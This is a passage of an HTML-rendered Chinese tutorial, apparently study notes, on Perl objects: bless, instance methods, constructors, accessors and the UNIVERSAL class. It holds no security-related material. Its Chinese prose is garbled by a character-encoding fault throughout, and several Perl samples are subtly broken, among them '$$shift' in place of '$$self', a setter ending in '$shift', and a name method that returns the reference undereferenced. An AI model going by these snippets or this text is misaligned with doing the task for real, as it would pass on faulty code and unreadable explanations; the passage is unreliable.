</span>&#123; <span class="hljs-string">&#x27;heigh&#x27;</span> &#125;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªå®ä¾‹ä¼šæœ‰å…³è”çš„å±æ€§ï¼Œç§°ä¸ºå®ä¾‹å˜é‡ (æˆ–å«æˆå‘˜å˜é‡).</p><p>åœ¨ Perl ä¸­ï¼Œå®ä¾‹å¿…é¡»æ˜¯ä¸€ä¸ªå†…ç½®ç±»å‹çš„å¼•ç”¨.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! perl</span><br><span class="hljs-comment"># scripts/horse.pl</span><br><br><span class="hljs-keyword">my</span> $name = <span class="hljs-string">&#x27;Mr. Ed&#x27;</span>;<br><span class="hljs-keyword">my</span> $tv_horse = \$name;<br><br><span class="hljs-keyword">bless</span> $tv_horse, <span class="hljs-string">&#x27;Horse&#x27;</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ <code>perldoc -f bless</code> ä¸­æŸ¥çœ‹ <code>bless</code> çš„ç”¨æ³•.</p><p><code>bless</code> åªèƒ½ä½œç”¨äºå¼•ç”¨.</p><p>è¿™é‡Œå°† <code>$tv_horse</code> å˜ä¸º <code>Horse</code> çš„å¯¹è±¡. (å°±æ˜¯ç»™ <code>tv_horse</code> é™„åŠ ä¸Š <code>Horse</code> è¿™ä¸ªåŒ…å)</p><p><img src="/../img/the_PeGS_structure_of_tv_horse.png"></p><p>æ­¤æ—¶ <code>tv_horse</code> æ˜¯ <code>Horse</code> ç±»çš„ä¸€ä¸ªå®ä¾‹ï¼Œä½†æ˜¯è¿™ä¸ªå¼•ç”¨å¹¶æ²¡æœ‰ä»€ä¹ˆæ”¹å˜ï¼Œä¾æ—§å¯ä»¥ç”¨ä¼ ç»Ÿçš„è§£å¼•ç”¨æ“ä½œç¬¦.</p><h2 id="15-2-è°ƒç”¨å®ä¾‹æ–¹æ³•"><a href="#15-2-è°ƒç”¨å®ä¾‹æ–¹æ³•" class="headerlink" title="15.2 è°ƒç”¨å®ä¾‹æ–¹æ³•"></a>15.2 è°ƒç”¨å®ä¾‹æ–¹æ³•</h2><p>Perl ä»è¢« bless è¿‡çš„å®ä¾‹å˜é‡ä¸­å–å‡ºç±»çš„åç§°ï¼Œç„¶åç”¨å®ƒæ¥å®šä½å’Œè°ƒç”¨æ–¹æ³•.</p><p>bless çš„ç›®çš„å°±æ˜¯æŠŠä¸€ä¸ªç±»å’Œè¿™ä¸ªå¼•ç”¨å…³è”èµ·æ¥ï¼Œè®© Perl è§£é‡Šå™¨èƒ½æ‰¾åˆ°é€‚å½“çš„æ–¹æ³•.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># scripts/horses.pl, as before</span><br><span class="hljs-keyword">my</span> $name = <span class="hljs-string">&#x27;Mr. Ed&#x27;</span>;<br><span class="hljs-keyword">my</span> $tv_horse = \$name;<br><br><span class="hljs-keyword">bless</span> $tv_horse, <span class="hljs-string">&#x27;Horse&#x27;</span>;<br><br><span class="hljs-keyword">my</span> $noise = $tv_horse-&gt;sound;<br></code></pre></td></tr></table></figure><p>Perl ä¼šç›´æ¥æŸ¥æ‰¾ Horse::Sound, åšä¸­ç”Ÿæˆçš„æ–¹æ³•è°ƒç”¨ä¸º:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">Horse::sound($tv_horse)<br></code></pre></td></tr></table></figure><p>ç›¸å½“äº <code>$tv_horse-&gt;sound</code> ä¼šä¼ å…¥ä¸€ä¸ªé»˜è®¤å‚æ•°.</p><h2 id="15-3-è®¿é—®å®ä¾‹æ•°æ®"><a href="#15-3-è®¿é—®å®ä¾‹æ•°æ®" class="headerlink" title="15.3 è®¿é—®å®ä¾‹æ•°æ®"></a>15.3 è®¿é—®å®ä¾‹æ•°æ®</h2><p>ä¸€ä¸ªå¸¸è§çš„æ–¹æ³•ï¼Œå°±æ˜¯ç”¨è¿‡ <code>shift</code> è¯­å¥ï¼Œå°†é»˜è®¤æ•°ç»„çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¼ é€’ç»™å®ä¾‹æ–¹æ³•ä¸€ä¸ªå« <code>$self</code> çš„æ ‡é‡.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">name</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>    $$<span class="hljs-keyword">shift</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="15-4-å¦‚ä½•æ„å»º-Horse-çš„å®ä¾‹"><a href="#15-4-å¦‚ä½•æ„å»º-Horse-çš„å®ä¾‹" class="headerlink" title="15.4 å¦‚ä½•æ„å»º Horse çš„å®ä¾‹"></a>15.4 å¦‚ä½•æ„å»º Horse çš„å®ä¾‹</h2><p>è®© Horse ç±»è‡ªåŠ¨æ„å»ºä¸€ä¸ªæ–°çš„ Horse å®ä¾‹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Horse;<br><span class="hljs-keyword">use</span> parent <span class="hljs-string">qw(Animal)</span>;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">sound</span> </span>&#123; <span class="hljs-string">&#x27;neigh&#x27;</span> &#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">name</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>    $$self;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">named</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $class = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> $name = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">bless</span> \$name, $class;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>bless</code> ä¼šè¿”å› <code>\$name</code>.</p><p>ä½¿ç”¨ <code>named</code> aæ–¹æ³•æ„å»ºä¸€ä¸ªå®ä¾‹ï¼Œè€Œä¸å¿…ç›´æ¥ç”Ÿæˆå¼•ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># my $name = &#x27;Mr. Ed&#x27;;</span><br><span class="hljs-comment"># my $tv_horse = \$name;</span><br><span class="hljs-keyword">my</span> $tv_horse = Horse-&gt;named(<span class="hljs-string">&#x27;Mr. Ed&#x27;</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯é»˜è®¤å‚æ•° â€˜Horseâ€™.</p><p><code>named</code> å°±æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°.</p><p>å¤§å¤šæ•°äººä½¿ç”¨ä¸€ä¸ªå«åš <code>new</code> çš„æ„é€ å‡½æ•°.</p><h2 id="15-5-ç»§æ‰¿æ„é€ å‡½æ•°"><a href="#15-5-ç»§æ‰¿æ„é€ å‡½æ•°" class="headerlink" title="15.5 ç»§æ‰¿æ„é€ å‡½æ•°"></a>15.5 ç»§æ‰¿æ„é€ å‡½æ•°</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Animal;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">name</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>    $$self;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">named</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $class = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> $name = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">bless</span> \$name, $class;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ä¸€ä¸ªå®ä¾‹ä¸Šè°ƒç”¨ <code>speak</code> æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $tv_horse = Horse-&gt;named(<span class="hljs-string">&#x27;Mr. Ed&#x27;</span>);<br>$tv_horse-&gt;speak;<br></code></pre></td></tr></table></figure><p>å¾—åˆ°çš„å€¼ä¸º:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">a Horse=<span class="hljs-keyword">SCALAR</span>(0xaca42ac) gose <span class="hljs-comment">neigh!</span><br></code></pre></td></tr></table></figure><h2 id="15-6-ç¼–å†™èƒ½å¤Ÿä½¿ç”¨ç±»æˆ–å®ä¾‹ä½œä¸ºå‚æ•°çš„æ–¹æ³•"><a href="#15-6-ç¼–å†™èƒ½å¤Ÿä½¿ç”¨ç±»æˆ–å®ä¾‹ä½œä¸ºå‚æ•°çš„æ–¹æ³•" class="headerlink" title="15.6 ç¼–å†™èƒ½å¤Ÿä½¿ç”¨ç±»æˆ–å®ä¾‹ä½œä¸ºå‚æ•°çš„æ–¹æ³•"></a>15.6 ç¼–å†™èƒ½å¤Ÿä½¿ç”¨ç±»æˆ–å®ä¾‹ä½œä¸ºå‚æ•°çš„æ–¹æ³•</h2><p>éœ€è¦åˆ¤æ–­æ–¹æ³•æ˜¯ç±»è¿˜æ˜¯å®ä¾‹ä¸Šè°ƒç”¨çš„.</p><p>ç±»ä½¿ç”¨çš„æ–¹æ³•é»˜è®¤å‚æ•°æ˜¯ç±»åï¼Œè€Œå®ä¾‹ä½¿ç”¨çš„æ–¹æ³•é»˜è®¤å‚æ•°æ˜¯å®ä¾‹å.</p><p>æœ€ç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨ <code>ref</code> æ“ä½œç¬¦. å¦‚æœ <code>ref</code> ä½œç”¨äºä¸€ä¸ª <code>bless</code> å¼•ç”¨ï¼Œå°±è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸² (ç±»å). å¦‚æœä½œç”¨äºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå°±è¿”å› <code>undef</code> (åƒä¸€ä¸ªç±»å).</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># in lib/Animal.pm</span><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">name</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $either = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">ref</span> $either<br>        ? $$either              <span class="hljs-comment"># it&#x27;s an instance. return name</span><br>        : <span class="hljs-string">&quot;an unnamed $either&quot;</span>; <span class="hljs-comment"># it&#x27;s a class, return generic</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="15-7-ä¸ºæ–¹æ³•æ·»åŠ å‚æ•°"><a href="#15-7-ä¸ºæ–¹æ³•æ·»åŠ å‚æ•°" class="headerlink" title="15.7 ä¸ºæ–¹æ³•æ·»åŠ å‚æ•°"></a>15.7 ä¸ºæ–¹æ³•æ·»åŠ å‚æ•°</h2><p>ä¸º Animal ç±»æ·»åŠ ä¸€ä¸ª eat æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Animal;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">named</span> </span>&#123;<br>    <span class="hljs-keyword">my</span>( $class, $name ) = @_;<br>    <span class="hljs-keyword">bless</span> \$name, $class;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">name</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $either = <span class="hljs-keyword">shift</span>;<br>    <br>    <span class="hljs-keyword">ref</span> $either<br>      ? $either<br>      : <span class="hljs-string">&quot;an unnamed $either&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">speak</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $either = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">print</span> $either-&gt;name, <span class="hljs-string">&#x27; goes &#x27;</span>, $either-&gt;sound, <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">eat</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $either = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> $food = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">print</span> $either-&gt;name, <span class="hljs-string">&quot; eats $food.\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç±»è°ƒç”¨çš„æ–¹æ³•ä¸€èˆ¬ç”¨ <code>$self</code>, å®ä¾‹è°ƒç”¨çš„æ–¹æ³•ä¸€èˆ¬ç”¨ <code>$either</code>.</p><p>ä½¿ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $tv_horse = Horse-&gt;named(<span class="hljs-string">&#x27;Mr. Ed&#x27;</span>);<br>$tv_horse-&gt;eat(<span class="hljs-string">&#x27;hay&#x27;</span>);<br>Sheep-&gt;eat(<span class="hljs-string">&#x27;grass&#x27;</span>);<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªè°ƒç”¨ç›¸å½“äº:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">Animal::eat($tv_horse, <span class="hljs-string">&#x27;hey&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="15-8-æ›´æœ‰è¶£çš„å®ä¾‹"><a href="#15-8-æ›´æœ‰è¶£çš„å®ä¾‹" class="headerlink" title="15.8 æ›´æœ‰è¶£çš„å®ä¾‹"></a>15.8 æ›´æœ‰è¶£çš„å®ä¾‹</h2><p>å°†æ•£åˆ—çš„é”®ä½œä¸ºæˆå‘˜å˜é‡ï¼Œç›¸åº”çš„å€¼å°±æ˜¯å¯¹åº”æ•°æ®é¡¹çš„å€¼.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $lost = <span class="hljs-keyword">bless</span> &#123; <span class="hljs-string">Name =&gt;</span> <span class="hljs-string">&#x27;Bo&#x27;</span>, <span class="hljs-string">Color =&gt;</span> <span class="hljs-string">&#x27;white&#x27;</span> &#125;, <span class="hljs-string">&#x27;Sheep&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="15-9-ä¸€åŒ¹ä¸åŒé¢œè‰²çš„é©¬"><a href="#15-9-ä¸€åŒ¹ä¸åŒé¢œè‰²çš„é©¬" class="headerlink" title="15.9 ä¸€åŒ¹ä¸åŒé¢œè‰²çš„é©¬"></a>15.9 ä¸€åŒ¹ä¸åŒé¢œè‰²çš„é©¬</h2><p>è·å–å’Œè®¾ç½®é¢œè‰²:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment"># in Animal</span><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">color</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>    $self-&gt;&#123;Color&#125;;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">set_color</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>    $self-&gt;&#123;Color&#125; = <span class="hljs-keyword">shift</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="15-10-æ”¶å›å­˜æ¬¾"><a href="#15-10-æ”¶å›å­˜æ¬¾" class="headerlink" title="15.10 æ”¶å›å­˜æ¬¾"></a>15.10 æ”¶å›å­˜æ¬¾</h2><p>setter çš„è¿”å›å€¼è€ƒè™‘:</p><ul><li>æ›´æ–°åçš„å‚æ•°</li><li>ä¹‹å‰çš„å€¼</li><li>å¯¹è±¡è‡ªèº«</li><li>æˆåŠŸ&#x2F;å¤±è´¥ä»£ç </li></ul><p>é¿å…å½“è°ƒç”¨ä¸ºç©ºä¸Šä¸‹æ–‡æ—¶ï¼Œå­˜å‚¨å‰ä¸€é¡¹çš„å€¼, ç”¨ <code>wantarray</code>, åœ¨ <code>perldoc -f wantarray</code> ä¸­æŸ¥çœ‹ç”¨æ³•.</p><p>å¦‚æœè¿”å›å¯¹è±¡æœ¬èº«ï¼Œå¯ä»¥ä½¿ç”¨è¿™æ ·çš„é“¾å¼è®¾å®š:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $tv_horse = <br>    Horse-&gt;named(<span class="hljs-string">&#x27;Mr. Ed&#x27;</span>)<br>         -&gt;set_color(<span class="hljs-string">&#x27;grey&#x27;</span>)<br>         -&gt;set_age(<span class="hljs-number">4</span>)<br>         -&gt;set_height(<span class="hljs-string">&#x27;17 hands&#x27;</span>);<br></code></pre></td></tr></table></figure><p>å› ä¸ºæ¯ä¸ª setter çš„è¿”å›å€¼æ˜¯åˆå§‹å¯¹è±¡, æˆä¸ºä¸‹ä¸€æ¬¡æ–¹æ³•è°ƒç”¨çš„å¯¹è±¡.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">set_color</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>    $self-&gt;&#123;Color&#125; = <span class="hljs-keyword">shift</span>;<br>    $shift;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="15-11-ä¸è¦æŸ¥çœ‹-â€œç›’å­â€-é‡Œé¢çš„å†…å®¹"><a href="#15-11-ä¸è¦æŸ¥çœ‹-â€œç›’å­â€-é‡Œé¢çš„å†…å®¹" class="headerlink" title="15.11 ä¸è¦æŸ¥çœ‹ â€œç›’å­â€ é‡Œé¢çš„å†…å®¹"></a>15.11 ä¸è¦æŸ¥çœ‹ â€œç›’å­â€ é‡Œé¢çš„å†…å®¹</h2><p>ä½¿ç”¨ setter å’Œ getter è€Œä¸çª¥è§†å†…éƒ¨çš„æ•°æ®ç»“æ„.</p><h2 id="15-12-æ›´å¿«çš„-setter-å’Œ-getter"><a href="#15-12-æ›´å¿«çš„-setter-å’Œ-getter" class="headerlink" title="15.12 æ›´å¿«çš„ setter å’Œ getter"></a>15.12 æ›´å¿«çš„ setter å’Œ getter</h2><h2 id="15-13-getter-ä½œä¸ºåŒå€çš„-setter"><a href="#15-13-getter-ä½œä¸ºåŒå€çš„-setter" class="headerlink" title="15.13 getter ä½œä¸ºåŒå€çš„ setter"></a>15.13 getter ä½œä¸ºåŒå€çš„ setter</h2><p>ç”¨ä¸€ä¸ªæ–¹æ³•æ¥å®Œæˆ getter å’Œ setter çš„å·¥ä½œ: å¦‚æœæ²¡æœ‰å‚æ•°ï¼Œå°±æ˜¯ä¸€ä¸ªå–å€¼æ“ä½œ (ç”¨ä½œ getter), å¦‚æœæœ‰å‚æ•°ï¼Œå°±æ˜¯ä¸€ä¸ªè®¾å€¼æ“ä½œ (ç”¨ä½œ setter).</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">color</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">if</span> (@_) &#123;       <span class="hljs-comment"># are there any more parameters?</span><br>        <span class="hljs-comment"># yes, it&#x27;s a setter:</span><br>        $self-&gt;&#123;Color&#125; = <span class="hljs-keyword">shift</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment"># no, it&#x27;s a getter:</span><br>        $self-&gt;&#123;Color&#125;;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="15-14-ä»…ä»…é™åˆ¶ä¸€ä¸ªç±»æ–¹æ³•æˆ–è€…å®ä¾‹æ–¹æ³•"><a href="#15-14-ä»…ä»…é™åˆ¶ä¸€ä¸ªç±»æ–¹æ³•æˆ–è€…å®ä¾‹æ–¹æ³•" class="headerlink" title="15.14 ä»…ä»…é™åˆ¶ä¸€ä¸ªç±»æ–¹æ³•æˆ–è€…å®ä¾‹æ–¹æ³•"></a>15.14 ä»…ä»…é™åˆ¶ä¸€ä¸ªç±»æ–¹æ³•æˆ–è€…å®ä¾‹æ–¹æ³•</h2><p>åœ¨ Perl ä¸­ï¼Œæ²¡æœ‰å“ªä¸ªæ–¹æ³•å®šä¹‰çš„å£°æ˜ä¸º: â€œè¿™æ˜¯ä¸€ä¸ªç±»æ–¹æ³•â€ æˆ–è€… â€œè¿™æ˜¯ä¸€ä¸ªå®ä¾‹æ–¹æ³•â€, å› ä¸ºå®ƒä»¬éƒ½æ˜¯ Perl çš„å­ä¾‹ç¨‹.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Carp <span class="hljs-string">qw(croak)</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">instance_only</span> </span>&#123;<br>    <span class="hljs-keyword">ref</span>(<span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>) <span class="hljs-keyword">or</span> croak <span class="hljs-string">&quot;instance variable needed&quot;</span>;<br>    ... <span class="hljs-keyword">use</span> $self as the instance ...<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">class_only</span> </span>&#123;<br>    <span class="hljs-keyword">ref</span>(<span class="hljs-keyword">my</span> $self = <span class="hljs-keyword">shift</span>) <span class="hljs-keyword">and</span> croak <span class="hljs-string">&quot;class variable needed&quot;</span>;<br>    ... <span class="hljs-keyword">use</span> $self as the class ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ç”¨ Carp æ¨¡å—æ¥ä»£æ›¿æ¨¡å—ä¸­çš„ <code>die</code> å’Œ <code>warn</code> è¯­å¥, <code>croak</code> å‡½æ•°æ˜¯å¦ä¸€ç§å½¢å¼çš„ <code>die</code> å‡½æ•°ï¼Œ<code>carp</code> å‡½æ•°å¯ç”¨ä½œ <code>warn</code> å‡½æ•°çš„æ›¿ä»£.</p><h1 id="ç¬¬16ç« -ä¸€äº›é«˜çº§å¯¹è±¡ä¸»é¢˜"><a href="#ç¬¬16ç« -ä¸€äº›é«˜çº§å¯¹è±¡ä¸»é¢˜" class="headerlink" title="ç¬¬16ç«  ä¸€äº›é«˜çº§å¯¹è±¡ä¸»é¢˜"></a>ç¬¬16ç«  ä¸€äº›é«˜çº§å¯¹è±¡ä¸»é¢˜</h1><h2 id="16-1-é€šç”¨æ–¹æ³•"><a href="#16-1-é€šç”¨æ–¹æ³•" class="headerlink" title="16.1 é€šç”¨æ–¹æ³•"></a>16.1 é€šç”¨æ–¹æ³•</h2><p>åœ¨å®šä¹‰ç±»æ—¶,æˆ‘ä»¬åœ¨æ¯ä¸ªåŒ…ä¸­é€šè¿‡å…¨å±€å˜é‡@ISAåˆ›å»ºäº†ç»§æ‰¿å±‚æ¬¡ã€‚åœ¨æŸ¥æ‰¾ä¸€ä¸ªæ–¹æ³•çš„è¿‡ç¨‹ä¸­,Perlè§£é‡Šå™¨ä¼šéå†@ISAæ ‘,ç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªåŒ¹é…çš„æ–¹æ³•æˆ–æŸ¥æ‰¾å¤±è´¥ã€‚</p><p>ç„¶è€Œ,åœ¨æŸ¥æ‰¾å¤±è´¥å,Perlè§£é‡Šå™¨é€šå¸¸ä¼šåœ¨ä¸€ä¸ªå«åš UNIVERSAL çš„ç‰¹æ®Šç±»ä¸­æŸ¥æ‰¾,å¹¶è°ƒç”¨å…¶ä¸­çš„ä¸€ä¸ªæ–¹æ³•,å¦‚æœæˆåŠŸåŒ¹é…,åˆ™è¯¥æ–¹æ³•å°±åƒä½äºä»»ä½•å…¶ä»–ç±»æˆ–è¶…ç±»ä¸­ä¸€æ ·ã€‚</p><p>UNIVERSAL æ˜¯æ‰€æœ‰å¯¹è±¡çš„åŸºç±»ï¼Œå¯ä»¥å°†ä»»ä½•æ–¹æ³•æ”¾åœ¨è¿™é‡Œ, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">UNIVERSAL</span>::<span class="hljs-title">fandango</span> </span>&#123;<br>    <span class="hljs-keyword">warn</span> <span class="hljs-string">&#x27;object &#x27;</span>, <span class="hljs-keyword">shift</span>, <span class="hljs-string">&quot; can do the fandango!\n&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>å…¶ä½¿å¾—ç¨‹åºçš„æ‰€æœ‰å¯¹è±¡éƒ½å¯ä»¥è¢« <code>$some_object-&gt;fandando</code> è°ƒç”¨.</p><p>UNIVERSAL åŒ…ä¸­ç¼–å†™çš„å¯ä»¥ç®—ä½œé€šç”¨æ–¹æ³•.</p><p>åº”å½“å°½åŠ›é¿å…ä½¿ç”¨ UNIVERSAL æ¨¡å—.</p><h2 id="16-2-ä¸ºäº†æ›´å¥½çš„è¡Œä¸ºè€Œæµ‹è¯•å¯¹è±¡"><a href="#16-2-ä¸ºäº†æ›´å¥½çš„è¡Œä¸ºè€Œæµ‹è¯•å¯¹è±¡" class="headerlink" title="16.2 ä¸ºäº†æ›´å¥½çš„è¡Œä¸ºè€Œæµ‹è¯•å¯¹è±¡"></a>16.2 ä¸ºäº†æ›´å¥½çš„è¡Œä¸ºè€Œæµ‹è¯•å¯¹è±¡</h2><p>é™¤äº†ä¸ºæˆ‘ä»¬æä¾›ä¸€ä¸ªç©ºé—´æ¥æ”¾ç½®é€šç”¨æ–¹æ³•ä»¥å¤–,UNIVERSALåŒ…åŒæ—¶é¢„åŠ è½½äº†ä¸¤ä¸ªéå¸¸æœ‰ç”¨çš„å®ç”¨æ–¹æ³•:DOESå’Œcanã€‚</p><p><code>DOES</code> æ–¹æ³•æŸ¥è¯¢ç±»å’Œå®ä¾‹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span 